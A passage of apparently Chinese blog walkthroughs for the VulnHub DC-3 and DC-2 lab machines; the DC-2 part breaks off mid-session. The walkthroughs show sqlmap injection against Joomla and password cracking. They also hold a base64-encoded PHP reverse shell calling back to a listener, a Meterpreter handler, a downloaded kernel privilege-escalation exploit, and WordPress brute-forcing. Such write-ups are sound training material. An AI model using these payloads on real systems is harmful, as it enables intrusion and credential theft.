foundYour Report <span class="token builtin class-name">:</span> reports/192.168.0.22/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>发现版本：Joomla 3.7.0 和后台地址 <a href="http://192.168.0.22/administrator/">http://192.168.0.22/administrator/</a></p></li><li><p>先看看有没有框架漏洞</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># searchsploit Joomla 3.7.0</span>----------------------------------------------------------------------------------- <span class="token operator">|</span>   Exploit Title  <span class="token operator">|</span>  Path <span class="token punctuation">(</span>/usr/share/exploitdb/<span class="token punctuation">)</span>   <span class="token operator">|</span>    ----------------------------------------------------------------------------------- <span class="token operator">|</span>   Joomla<span class="token operator">!</span> <span class="token number">3.7</span>.0 - <span class="token string">'com_fields'</span> SQL Injection  <span class="token operator">|</span> exploits/php/webapps/42033.txt  <span class="token operator">|</span>----------------------------------------------------------------------------------- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>有个sql注入</p></li><li><p>看看他注入点</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/share/exploitdb/exploits/php/webapps/42033.txtUsing Sqlmap:sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-p</span> <span class="token string">'list[fullordering]'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>直接用sqlmap 跑就完了</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span class="token parameter variable">--dbs</span>available databases <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>:<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema<span class="token punctuation">[</span>*<span class="token punctuation">]</span> joomladb<span class="token punctuation">[</span>*<span class="token punctuation">]</span> mysql<span class="token punctuation">[</span>*<span class="token punctuation">]</span> performance_schema<span class="token punctuation">[</span>*<span class="token punctuation">]</span> sys<span class="token comment">#显然joomladb就是网站的数据库了 当然也可以跑出来</span>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> --current-db<span class="token number">15</span>:55:43<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching current database<span class="token punctuation">[</span><span class="token number">15</span>:55:43<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resumed: <span class="token string">'joomladb'</span>current database:    <span class="token string">'joomladb'</span><span class="token comment"># 列表名：</span>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span class="token parameter variable">-D</span> joomladb <span class="token parameter variable">--tables</span>Database: joomladb<span class="token punctuation">[</span><span class="token number">76</span> tables<span class="token punctuation">]</span>-----------------------<span class="token operator">|</span> <span class="token comment">#__users            |</span>-----------------------<span class="token comment"># 76个表就不都写出来了</span><span class="token comment"># 列字段</span>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span class="token parameter variable">-D</span> joomladb <span class="token parameter variable">-T</span> <span class="token string">"#__users"</span> <span class="token parameter variable">-columns</span><span class="token keyword">do</span> you want to use common <span class="token function">column</span> existence check? <span class="token punctuation">[</span>y/N/q<span class="token punctuation">]</span><span class="token comment">#这里选择yes 然后选择1</span>Database: joomladbTable: <span class="token comment">#__users</span><span class="token punctuation">[</span><span class="token number">5</span> columns<span class="token punctuation">]</span>+----------+-------------+<span class="token operator">|</span> Column   <span class="token operator">|</span> Type        <span class="token operator">|</span>+----------+-------------+<span class="token operator">|</span> email    <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> numeric     <span class="token operator">|</span><span class="token operator">|</span> name     <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> password <span class="token operator">|</span> non-numeric <span class="token operator">|</span><span class="token operator">|</span> username <span class="token operator">|</span> non-numeric <span class="token operator">|</span>+----------+-------------+<span class="token comment"># 列出来了字段,把数据爆出来</span>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.22/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span class="token parameter variable">-D</span> joomladb <span class="token parameter variable">-T</span> <span class="token string">"#__users"</span> <span class="token parameter variable">-C</span> username,password <span class="token parameter variable">--dump</span>Database: joomladbTable: <span class="token comment">#__users</span><span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>+----------+--------------------------------------------------------------+<span class="token operator">|</span> username <span class="token operator">|</span> password                                                     <span class="token operator">|</span>+----------+--------------------------------------------------------------+<span class="token operator">|</span> admin    <span class="token operator">|</span> <span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> <span class="token operator">|</span>+----------+--------------------------------------------------------------+<span class="token comment"># 用户名得到了，密码是加密的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>这里可以用<code>john</code>来破解，也可以用 <code>brupsuite</code> 来爆破</p></li><li><p>我们就用 <code>john</code> 来破解吧</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span> <span class="token operator">></span> /tmp/pwd<span class="token comment"># note: 用双引号要加 \$ 把 $转义掉</span><span class="token comment">#接着就是 ：</span>john /tmp/pwd<span class="token comment">#得到密码：snoopy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>登录之后</p></li><li><p>在template里面添加了一个木马（文件名设置成了1.php） (会造成我本地查杀，所以我base64了一下)</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMC4yMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>然后用msf连接的</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolemsf5 <span class="token operator">></span> use exploit/multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.22msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span class="token comment">#然后浏览器访问 http://192.168.0.22/templates/beez3/1.php</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">0.0</span>.0.0:4444<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">38288</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.0.22<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.0.21:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.0.22:55430<span class="token punctuation">)</span> at <span class="token number">2020</span>-04-29 <span class="token number">16</span>:43:47 +0800meterpreter <span class="token operator">></span> <span class="token comment"># 就连接上了</span>meterpreter <span class="token operator">></span> shell <span class="token comment"># 进shell </span>python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span> <span class="token comment"># 获得标准shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>然后查看用户 <code>cd /home</code></p></li><li><p>发现只有一个dc3的用户</p></li><li><p>啥也没有</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment"># 找suid的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>也没发现可以用的</p></li><li><p>只能试试系统提权了</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span> <span class="token comment">#查看内核信息</span>Linux DC-3 <span class="token number">4.4</span>.0-21-generic <span class="token comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span><span class="token function">cat</span> /etc/*release <span class="token comment">#查看版本信息</span><span class="token assign-left variable">DISTRIB_ID</span><span class="token operator">=</span>Ubuntu<span class="token assign-left variable">DISTRIB_RELEASE</span><span class="token operator">=</span><span class="token number">16.04</span><span class="token assign-left variable">DISTRIB_CODENAME</span><span class="token operator">=</span>xenial<span class="token assign-left variable">DISTRIB_DESCRIPTION</span><span class="token operator">=</span><span class="token string">"Ubuntu 16.04 LTS"</span><span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu"</span><span class="token assign-left variable">VERSION</span><span class="token operator">=</span><span class="token string">"16.04 LTS (Xenial Xerus)"</span><span class="token assign-left variable">ID</span><span class="token operator">=</span>ubuntu<span class="token assign-left variable">ID_LIKE</span><span class="token operator">=</span>debian<span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu 16.04 LTS"</span><span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token string">"16.04"</span><span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"http://www.ubuntu.com/"</span><span class="token assign-left variable">SUPPORT_URL</span><span class="token operator">=</span><span class="token string">"http://help.ubuntu.com/"</span><span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"http://bugs.launchpad.net/ubuntu/"</span><span class="token assign-left variable">UBUNTU_CODENAME</span><span class="token operator">=</span>xenial<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>搜索 Ubuntu 16.04 漏洞</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit ubuntu <span class="token number">16.04</span><span class="token comment"># 找到一个39772.txt</span>Linux Kernel <span class="token number">4.4</span>.x <span class="token punctuation">(</span>Ubuntu <span class="token number">16.04</span><span class="token punctuation">)</span> - <span class="token string">'double-fdput()'</span> bpf<span class="token punctuation">(</span>BPF_PROG_LOAD<span class="token punctuation">)</span> Privilege Escalation          <span class="token operator">|</span> exploits/linux/local/39772.txt<span class="token comment"># 直接利用 CVE-2016-4557</span><span class="token function">wget</span> https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<span class="token function">unzip</span> <span class="token number">39772</span>.zip<span class="token builtin class-name">cd</span> <span class="token number">39772</span><span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_exploit./compile.sh./doubleput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-获取-root-flag"><a href="#2-获取-root-flag" class="headerlink" title="2. 获取 root flag"></a>2. 获取 root flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/the-flag.txt     __        __   _ _   ____                   _ _ _ _ <span class="token punctuation">\</span> <span class="token punctuation">\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  _ <span class="token punctuation">\</span>  ___  _ __   ___<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ \ / _ \ | | | |   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)Congratulations are in order for completing DC-3VM.  :-)I hope you'</span>ve enjoyed this challenge as much as I enjoyed making it.If there are any ways that I can improve these little challenges,please <span class="token builtin class-name">let</span> me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>Nmap: the Network Mappercd /root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶机渗透</title>
      <link href="/dc-2/"/>
      <url>/dc-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2靶机渗透"><a href="#DC-2靶机渗透" class="headerlink" title="DC-2靶机渗透"></a>DC-2靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul><li><p>主机发现： <code>nmap -sP 192.168.0.1/24</code></p></li><li><p>发现了DC-2的IP地址： <code>192.168.0.131</code></p></li><li><p>下载主机的时候要添加dns到hosts文件</p></li><li><p><code>echo “192.168.0.131    dc-2 ”  &gt;&gt; /etc/hosts</code></p></li><li><p>添加好了 ping一下 dc-2，ping 通了表示成功了</p></li><li><p>接下来就是端口发现了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-oN</span> /tmp/DC-2.txt <span class="token number">192.168</span>.0.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Nmap 7.70 scan initiated Mon Apr 27 14:28:47 2020 as: nmap -sS -A -p- -oN /tmp/DC-2.txt 192.168.0.131</span>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.0.131Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00033s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65533</span> closed portsPORT     STATE SERVICE VERSION<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.10 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span class="token operator">|</span>_http-server-header: Apache/2.4.10 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token operator">|</span>_http-title: Did not follow redirect to http://dc-2/<span class="token number">7744</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u7 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey: <span class="token operator">|</span>   <span class="token number">1024</span> <span class="token number">52</span>:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">59</span>:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">256</span> df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>MAC Address: 00:0C:29:F6:92:EE <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>Network Distance: <span class="token number">1</span> hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">0.33</span> ms <span class="token number">192.168</span>.0.131OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span><span class="token comment"># Nmap done at Mon Apr 27 14:29:04 2020 -- 1 IP address (1 host up) scanned in 17.46 seconds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>只有7744（ssh） 和 80 （http)</p></li><li><p>先看看http的</p></li><li><p>发现是一个 <code>wordpress</code>框架</p></li><li><p>还找到一个flag页面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Flag <span class="token number">1</span>:Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just can’t win them all.Log <span class="token keyword">in</span> as one to see the next flag.If you can’t <span class="token function">find</span> it, log <span class="token keyword">in</span> as another.<span class="token comment">#标志1：</span><span class="token comment">#你通常的单词表可能不起作用，所以，也许你只需要试试cewl。</span><span class="token comment">#密码越多越好，但有时你不能赢得所有的密码。</span><span class="token comment">#作为一个登录以查看下一个标志。</span><span class="token comment">#如果找不到，请以另一个身份登录。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提示是用 <code>cewl</code> 生成密码文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl <span class="token parameter variable">-w</span> /tmp/passwd.lst http://dc-2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后用这个密码来爆破</p></li><li><p>当然 <code>wordpress</code> 可以枚举用户名的</p></li><li><p>这里我们用<code>wpscan</code>来扫面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#先扫描用户</span>wpscan <span class="token parameter variable">--url</span> https://dc-2/ <span class="token parameter variable">--enumerate</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>找到用户名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:<span class="token punctuation">[</span>+<span class="token punctuation">]</span> admin<span class="token operator">|</span> Found By: Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span><span class="token operator">|</span> Confirmed By:<span class="token operator">|</span>  Wp Json Api <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token operator">|</span>   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token assign-left variable">page</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> jerry<span class="token operator">|</span> Found By: Wp Json Api <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token operator">|</span>  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token assign-left variable">page</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">|</span> Confirmed By:<span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> tom<span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No WPVulnDB API Token given, as a result vulnerability data has not been output.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> You can get a <span class="token function">free</span> API token with <span class="token number">50</span> daily requests by registering at https://wpvulndb.com/users/sign_up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>用户名：admin、jerry、tom</p></li><li><p>然后爆破其密码：(密码本就是刚刚我们用cewl生成的)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://dc-2 <span class="token parameter variable">--usernames</span> admin,jerry,tom  <span class="token parameter variable">--passwords</span>  /tmp/passwd.lst <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>就扫面出来了两个密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Performing password attack on Xmlrpc against <span class="token number">3</span> user/s<span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> - jerry / adipiscing<span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> - tom / parturient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>现在就是登陆后台拿shell了</p></li><li><p>当然知道点wordpress的都知道 <code>http://dc-2/wp-admin/</code>就能登录后台</p></li><li><p>不知道的爆破一下目录也可以哦</p></li><li><p>然后就随便登录了一个</p></li><li><p>在page里面发现了 flag 2</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Flag <span class="token number">2</span>:If you can't exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.标志2：如果你不能利用WordPress并抄近路，还有别的办法。希望你能找到另一个切入点。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>看了一圈，也用msf搞了一顿~</p></li><li><p>还是没能拿到shell</p></li><li><p>还有别的办法？</p></li><li><p>那只有ssh了</p></li><li><p>前面扫到ssh在7744端口</p></li><li><p>那我们就连用这两个网站密码连一下看看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> jerry@dc-2 <span class="token parameter variable">-p</span> <span class="token number">7744</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>发现登不进去 权限不足？</p></li><li><p>再试试tom</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> tom@dc-2 <span class="token parameter variable">-p</span> <span class="token number">7744</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>这个能登进去</p></li><li><p>但是~</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token function">ls</span>flag3.txt  usrtom@DC-2:~$tom@DC-2:~$tom@DC-2:~$ <span class="token function">id</span>-rbash: id: <span class="token builtin class-name">command</span> not foundtom@DC-2:~$tom@DC-2:~$ <span class="token function">ls</span>flag3.txt  usrtom@DC-2:~$ <span class="token function">cat</span>-rbash: 